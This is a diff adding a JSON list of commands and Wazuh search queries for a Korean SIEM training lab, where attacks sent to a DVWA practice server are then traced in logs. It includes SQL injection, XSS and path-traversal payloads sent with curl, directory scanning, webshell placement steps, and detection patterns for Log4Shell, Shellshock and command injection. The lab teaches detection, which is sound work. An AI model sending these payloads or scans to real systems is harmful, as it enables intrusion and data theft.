+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Apache 원본 로그 확인",
+    "id": "C05-03",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-03.txt",
+    "text": "cd /var/log/apache2"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Apache 원본 로그 확인",
+    "id": "C05-04",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-04.txt",
+    "text": "grep -F '/vulnerabilities/sqli/?id=1&Submit=Submit' \\\n  dvwa_access.log"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Apache 원본 로그 확인",
+    "id": "C05-05",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-05.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "SQL 공격 요청 검색",
+    "id": "Q05-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter05/Q05-02.txt",
+    "text": "agent.name: \"web\" AND data.url: *vulnerabilities/sqli/*\nAND data.url: *UNION*"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "5.6  WAF 차단 근거 확인",
+    "id": "Q05-03",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter05/Q05-03.txt",
+    "text": "agent.name: \"web\"\nAND location: \"/var/log/apache2/modsec_audit.log\"\nAND data.request.request_line: *UNION*"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "XSS 요청의 경보 분석",
+    "id": "Q05-04",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter05/Q05-04.txt",
+    "text": "agent.name: \"web\" AND data.url: *vulnerabilities/xss_r/*\nAND rule.id: \"31105\""
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "파일 경로 변경 요청",
+    "id": "Q05-05",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter05/Q05-05.txt",
+    "text": "agent.name: \"web\"\nAND data.url: *book05-browser-path*"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "5.9  검색 조건 확대",
+    "id": "Q05-06",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter05/Q05-06.txt",
+    "text": "agent.name: \"web\" AND\n(rule.id: \"31104\" OR data.url: *etc*passwd*)"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "5.9  검색 조건 확대",
+    "id": "Q05-07",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter05/Q05-07.txt",
+    "text": "agent.name: \"web\" AND data.srcip: \"10.20.30.254\"\nAND (rule.id: \"31104\" OR data.url: *etc*passwd*)"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "WAF와 수집 설정 확인",
+    "id": "C05-06",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-06.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "WAF와 수집 설정 확인",
+    "id": "C05-07",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-07.txt",
+    "text": "grep -n -E '^SecRuleEngine|^SecAuditEngine' \\\n  /etc/modsecurity/modsecurity.conf"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "WAF와 수집 설정 확인",
+    "id": "C05-08",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-08.txt",
+    "text": "grep -n -E 'ServerName|SecRuleEngine' \\\n  /etc/apache2/sites-enabled/020-dvwa.conf"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "수집 설정 확인",
+    "id": "C05-09",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-09.txt",
+    "text": "grep -F -B 1 -A 1 '*_access.log' \\\n  /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "수집 설정 확인",
+    "id": "C05-10",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-10.txt",
+    "text": "grep -F -B 1 -A 1 'modsec_audit.log' \\\n  /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "수집 설정 확인",
+    "id": "C05-11",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-11.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Wazuh 규칙 파일 확인",
+    "id": "C05-12",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-12.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Wazuh 규칙 파일 확인",
+    "id": "C05-13",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-13.txt",
+    "text": "cd /var/ossec/ruleset/rules"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Wazuh 규칙 파일 확인",
+    "id": "C05-14",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-14.txt",
+    "text": "grep -n -A 9 '<rule id=\"31104\"' \\\n  0245-web_rules.xml"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "Wazuh 규칙 파일 확인",
+    "id": "C05-15",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter05/C05-15.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "5.13  curl을 이용한 HTTP 요청(선택)",
+    "id": "C05-16",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-16.txt",
+    "text": "curl --version"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "5.13  curl을 이용한 HTTP 요청(선택)",
+    "id": "C05-17",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-17.txt",
+    "text": "ip -br -4 address"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "공격자 VM의 이름 설정",
+    "id": "C05-18",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-18.txt",
+    "text": "grep -n -F 'dvwa.' /etc/hosts"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "공격자 VM의 이름 설정",
+    "id": "C05-19",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-19.txt",
+    "text": "sudo nano /etc/hosts"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "공격자 VM의 이름 설정",
+    "id": "C05-20",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-20.txt",
+    "text": "getent hosts dvwa.ccc.com"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "공격자 VM의 이름 설정",
+    "id": "C05-21",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-21.txt",
+    "text": "DVWA='http://dvwa.ccc.com'"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "공격자 VM의 이름 설정",
+    "id": "C05-22",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-22.txt",
+    "text": "echo \"$DVWA\""
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "시각 확인",
+    "id": "C05-23",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-23.txt",
+    "text": "date -Is"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "시각 확인",
+    "id": "C05-24",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-24.txt",
+    "text": "date -Is"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "시각 확인",
+    "id": "C05-25",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-25.txt",
+    "text": "timedatectl status"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "시각 확인",
+    "id": "C05-26",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-26.txt",
+    "text": "sudo timedatectl set-ntp true"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl의 기본 응답 확인",
+    "id": "C05-27",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-27.txt",
+    "text": "curl -sS -i --max-time 15 \"$DVWA/login.php\""
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl의 정상 값 전송",
+    "id": "C05-28",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-28.txt",
+    "text": "curl -sS -i --max-time 15 --get \\\n  \"$DVWA/vulnerabilities/sqli/\" \\\n  --data-urlencode 'id=1' \\\n  --data-urlencode 'Submit=Submit' \\\n  --data-urlencode 'bookcase=book05-normal'"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl의 SQL 구문 전송",
+    "id": "C05-29",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-29.txt",
+    "text": "PAYLOAD=\"1' UNION SELECT user,password FROM users-- \""
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl의 SQL 구문 전송",
+    "id": "C05-30",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-30.txt",
+    "text": "curl -sS -i --max-time 15 --get \\\n  \"$DVWA/vulnerabilities/sqli/\" \\\n  --data-urlencode \"id=$PAYLOAD\" \\\n  --data-urlencode 'Submit=Submit' \\\n  --data-urlencode 'bookcase=book05-sqli'"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl의 스크립트 전송",
+    "id": "C05-31",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-31.txt",
+    "text": "curl -sS -i --max-time 15 --get \\\n  \"$DVWA/vulnerabilities/xss_r/\" \\\n  --data-urlencode 'name=<script>alert(1)</script>' \\\n  --data-urlencode 'bookcase=book05-xss'"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl의 인코딩 경로 전송",
+    "id": "C05-32",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-32.txt",
+    "text": "curl -sS -i --max-time 15 --get \\\n  \"$DVWA/vulnerabilities/fi/\" \\\n  --data-urlencode 'page=../../../../../etc/passwd' \\\n  --data 'bookcase=book05-path'"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl의 경로 원문 전송",
+    "id": "C05-33",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-33.txt",
+    "text": "curl -sS -i --max-time 15 --get \\\n  \"$DVWA/vulnerabilities/fi/\" \\\n  --data 'page=../../../../../etc/passwd' \\\n  --data 'bookcase=book05-path-raw'"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl 실습 원상복구",
+    "id": "C05-34",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-34.txt",
+    "text": "grep -n -F 'dvwa.' /etc/hosts"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl 실습 원상복구",
+    "id": "C05-35",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-35.txt",
+    "text": "sudo nano /etc/hosts"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl 실습 원상복구",
+    "id": "C05-36",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-36.txt",
+    "text": "grep -n -F 'dvwa.' /etc/hosts"
+  },
+  {
+    "document": "volume01-chapter05.json",
+    "section": "curl 실습 원상복구",
+    "id": "C05-37",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter05/C05-37.txt",
+    "text": "unset DVWA PAYLOAD"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "없는 경로의 응답과 경보",
+    "id": "Q06-01",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-01.txt",
+    "text": "agent.name: \"web\"\nAND data.url: \"/book06-missing\""
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "목록 탐색 도구 준비",
+    "id": "C06-01",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-01.txt",
+    "text": "gobuster -h"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "설치와 이름 해석 확인",
+    "id": "C06-02",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-02.txt",
+    "text": "sudo apt update"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "설치와 이름 해석 확인",
+    "id": "C06-03",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-03.txt",
+    "text": "sudo apt install gobuster"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "설치와 이름 해석 확인",
+    "id": "C06-04",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-04.txt",
+    "text": "getent hosts dvwa.ccc.com"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "탐색 경로 목록 작성",
+    "id": "C06-05",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-05.txt",
+    "text": "cd ~"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "탐색 경로 목록 작성",
+    "id": "C06-06",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-06.txt",
+    "text": "ls -l book06-paths.txt"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "탐색 경로 목록 작성",
+    "id": "C06-07",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-07.txt",
+    "text": "nano book06-paths.txt"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "탐색 경로 목록 작성",
+    "id": "C06-08",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-08.txt",
+    "text": "cat book06-paths.txt"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "경로 목록을 이용한 탐색",
+    "id": "C06-09",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-09.txt",
+    "text": "gobuster -m dir \\\n  -u http://dvwa.ccc.com/ \\\n  -w book06-paths.txt -t 1 -a book06-scan"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "반복 요청 검색",
+    "id": "Q06-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-02.txt",
+    "text": "agent.name: \"web\"\nAND full_log: \"book06-scan\""
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "반복 요청 검색",
+    "id": "Q06-03",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-03.txt",
+    "text": "agent.name: \"web\" AND rule.id: \"31151\"\nAND full_log: \"book06-scan\""
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "반복 경보의 조건 확인",
+    "id": "C06-10",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-10.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "반복 경보의 조건 확인",
+    "id": "C06-11",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-11.txt",
+    "text": "cd /var/ossec/ruleset/rules"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "반복 경보의 조건 확인",
+    "id": "C06-12",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-12.txt",
+    "text": "sed -n '/<rule id=\"31151\"/,/<\\/rule>/p' \\\n  0245-web_rules.xml"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "반복 경보의 조건 확인",
+    "id": "C06-13",
+    "where": "kt66-siem 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-13.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "User-Agent 기록 검색",
+    "id": "Q06-04",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-04.txt",
+    "text": "agent.name: \"web\" AND data.url: \"/book06-ua\"\nAND full_log: \"sqlmap\""
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "WAF 차단 규칙 확인",
+    "id": "Q06-05",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter06/Q06-05.txt",
+    "text": "agent.name: \"web\"\nAND location: \"/var/log/apache2/modsec_audit.log\"\nAND data.request.request_line: *book06-ua*"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "일반 로그인 기록 검색",
+    "id": "Q06-06",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter06/Q06-06.txt",
+    "text": "agent.name: \"web\" AND data.protocol: \"POST\"\nAND data.url: \"/login.php\""
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "인증 요청 URL 분석",
+    "id": "Q06-07",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter06/Q06-07.txt",
+    "text": "agent.name: \"web\"\nAND data.url: *vulnerabilities/brute/*\nAND data.url: *username=admin*"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "메서드 요청의 접속 기록",
+    "id": "Q06-08",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-08.txt",
+    "text": "agent.name: \"web\" AND data.protocol: \"PROPFIND\"\nAND data.url: \"/book06-method\""
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "허용 메서드 정책과 대조",
+    "id": "Q06-09",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter06/Q06-09.txt",
+    "text": "agent.name: \"web\"\nAND location: \"/var/log/apache2/modsec_audit.log\"\nAND data.request.request_line: *book06-method*"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "관리 경로의 출발지 조사",
+    "id": "Q06-10",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-10.txt",
+    "text": "agent.name: \"web\"\nAND data.url: (\"/admin/\" OR \"/phpmyadmin/\"\nOR \"/wp-admin/\" OR \"/manager/html\")"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "로그 크기 경보 분석",
+    "id": "Q06-11",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-11.txt",
+    "text": "agent.name: \"web\" AND rule.id: \"31115\"\nAND data.url: *book06-long*"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "6.8  원본 access 로그 확인",
+    "id": "C06-14",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-14.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "6.8  원본 access 로그 확인",
+    "id": "C06-15",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-15.txt",
+    "text": "cd /var/log/apache2"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "6.8  원본 access 로그 확인",
+    "id": "C06-16",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-16.txt",
+    "text": "grep -F 'book06-scan' dvwa_access.log"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "6.8  원본 access 로그 확인",
+    "id": "C06-17",
+    "where": "kt66-web 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-17.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "로그인 처리 코드의 위치",
+    "id": "C06-18",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-18.txt",
+    "text": "docker exec -it kt66-dvwa /bin/bash"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "로그인 처리 코드의 위치",
+    "id": "C06-19",
+    "where": "kt66-dvwa 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-19.txt",
+    "text": "cd /var/www/html"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "로그인 처리 코드의 위치",
+    "id": "C06-20",
+    "where": "kt66-dvwa 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-20.txt",
+    "text": "grep -nE 'checkToken|generateSessionToken|dvwaRedirect' \\\n  login.php"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "로그인 처리 코드의 위치",
+    "id": "C06-21",
+    "where": "kt66-dvwa 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-21.txt",
+    "text": "grep -nE 'GET|Welcome|incorrect' \\\n  vulnerabilities/brute/source/low.php"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "로그인 처리 코드의 위치",
+    "id": "C06-22",
+    "where": "kt66-dvwa 컨테이너 안",
+    "file": "examples/rev02/chapter06/C06-22.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "원상복구와 조사 기록",
+    "id": "C06-23",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-23.txt",
+    "text": "cat ~/book06-paths.txt"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "원상복구와 조사 기록",
+    "id": "C06-24",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-24.txt",
+    "text": "rm -i ~/book06-paths.txt"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "원상복구와 조사 기록",
+    "id": "C06-25",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-25.txt",
+    "text": "ls -l ~/book06-paths.txt"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "6.10  curl의 헤더 지정(선택)",
+    "id": "C06-26",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-26.txt",
+    "text": "curl --version"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "6.10  curl의 헤더 지정(선택)",
+    "id": "C06-27",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-27.txt",
+    "text": "curl -i --max-time 15 \\\n  -A \"sqlmap/1.0 book06-curl-ua\" \\\n  http://dvwa.ccc.com/book06-curl-ua"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "6.10  curl의 헤더 지정(선택)",
+    "id": "Q06-12",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-12.txt",
+    "text": "agent.name: \"web\" AND data.url: *book06-curl-ua*"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "curl의 메서드 지정(선택)",
+    "id": "C06-28",
+    "where": "공격자 VM · 터미널",
+    "file": "examples/rev02/chapter06/C06-28.txt",
+    "text": "curl -i --max-time 15 -X PROPFIND \\\n  http://dvwa.ccc.com/book06-curl-method"
+  },
+  {
+    "document": "volume01-chapter06.json",
+    "section": "curl의 메서드 지정(선택)",
+    "id": "Q06-13",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter06/Q06-13.txt",
+    "text": "agent.name: \"web\" AND data.url: *book06-curl-method*"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "경보가 없을 때 원문 확인",
+    "id": "C07-01",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-01.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "경보가 없을 때 원문 확인",
+    "id": "C07-02",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-02.txt",
+    "text": "tail -n 20 /var/log/apache2/dvwa_access.log"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "경보가 없을 때 원문 확인",
+    "id": "C07-03",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-03.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감시 경로와 생성 전 확인",
+    "id": "C07-04",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-04.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감시 경로와 생성 전 확인",
+    "id": "C07-05",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-05.txt",
+    "text": "grep -n -F '/var/www' /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "감시 경로와 생성 전 확인",
+    "id": "C07-06",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-06.txt",
+    "text": "ls -ld /var/www/html/uploads"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "웹셸 코드 저장",
+    "id": "C07-07",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-07.txt",
+    "text": "ls -l /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "웹셸 코드 저장",
+    "id": "C07-08",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-08.txt",
+    "text": "vim /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "파일 확인과 웹 요청",
+    "id": "C07-09",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-09.txt",
+    "text": "cat /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "파일 확인과 웹 요청",
+    "id": "C07-10",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-10.txt",
+    "text": "exit"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "FIM 경보와 요청 검색",
+    "id": "Q07-01",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-01.txt",
+    "text": "agent.name: \"web\" AND rule.id: \"554\"\nAND syscheck.path: *shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "FIM 경보와 요청 검색",
+    "id": "Q07-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-02.txt",
+    "text": "agent.name: \"web\"\nAND data.url: *shell.php*"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "실습 파일 원상복구",
+    "id": "C07-11",
+    "where": "kt66 VM · 터미널",
+    "file": "examples/rev02/chapter07/C07-11.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "실습 파일 원상복구",
+    "id": "C07-12",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-12.txt",
+    "text": "cat /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "실습 파일 원상복구",
+    "id": "C07-13",
+    "where": "kt66-web · 컨테이너 셸",
+    "file": "examples/rev02/chapter07/C07-13.txt",
+    "text": "rm -i /var/www/html/uploads/shell.php"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "원문에서 입력 찾기",
+    "id": "Q07-03",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-03.txt",
+    "text": "agent.name: \"web\"\nAND (full_log: *jndi* OR data.url: *jndi*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "변형 입력과 수집 한계",
+    "id": "Q07-04",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter07/Q07-04.txt",
+    "text": "agent.name: \"web\"\nAND (full_log: *jndi* OR full_log: *lower*\n     OR data.url: *%24%7B*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "Shellshock 규칙 검색",
+    "id": "Q07-05",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-05.txt",
+    "text": "agent.name: \"web\"\nAND (rule.id: (31166 OR 31167 OR 31168 OR 31169)\n     OR rule.description: *Shellshock*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "접속 기록의 필드 해석",
+    "id": "Q07-06",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-06.txt",
+    "text": "agent.name: \"web\"\nAND data.url: (*vulnerabilities/exec/* OR *track-order*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "명령 문자열과 WAF 검색",
+    "id": "Q07-07",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter07/Q07-07.txt",
+    "text": "agent.name: \"web\" AND data.url:\n(*%3Bid* OR *;id* OR *%7Ccat* OR *cat%20*\n OR *whoami* OR *%24%28*)"
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "명령 문자열과 WAF 검색",
+    "id": "Q07-08",
+    "where": "Windows · Discover · wazuh-archives-*",
+    "file": "examples/rev02/chapter07/Q07-08.txt",
+    "text": "agent.name: \"web\"\nAND location: \"/var/log/apache2/modsec_audit.log\""
+  },
+  {
+    "document": "volume01-chapter07.json",
+    "section": "200 경보의 우선 조사",
+    "id": "Q07-09",
+    "where": "Windows · Discover · wazuh-alerts-*",
